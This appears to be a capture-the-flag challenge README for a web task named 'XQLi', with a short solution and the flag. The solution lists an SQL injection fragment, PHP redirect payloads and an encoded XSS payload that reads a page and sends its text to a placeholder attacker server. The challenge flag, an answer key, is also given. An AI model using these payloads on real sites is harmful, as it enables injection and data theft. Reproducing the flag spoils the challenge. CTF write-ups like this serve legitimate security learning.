# XQLi

**Description:**  What is my perfect crime? I break into Tiffany's at midnight. Do I go for the vault? No, I go for the chandelier. It's priceless. As I'm taking it down, a woman catches me. She tells me to stop. It's her father's business. She's Tiffany. I say no. We make......  
All that and he locked himself out the website that had a secret code to break into the place :/ . Help him find the code?

**Author:** [Az3z3l](https://twitter.com/Az3z3l)

**Short Solution:** 
 - For SQLI: `lcase('inKypinKy') as id from dual`
 - Creating UID: Host a webpage that has the following php code `header("location:http://web/user.php?session=1111-22222-1234&sub=submit%22);`
 - Retrieving Flag: Host a webpage that has the following php code `header("location:http://web/flag.php?session%3D%22%3E%3Ciframe+id%3D%22a%22+src%3D%22http%3A%2F%2Fweb%2Fflag.php%3Fsession%3D1111-22222-1234%26sub%3Dsubmit%22+onload%3Dwindow.location%3D%22<your_server>%3F%22%2Bbtoa%28document.getElementById%28%27a%27%29.contentWindow.document.body.innerText%29%3E%26sub%3Dsubmit%22%29%3B`


**Flag:** inctf{p3op13_persons_c7f_pe0p13_9986000}
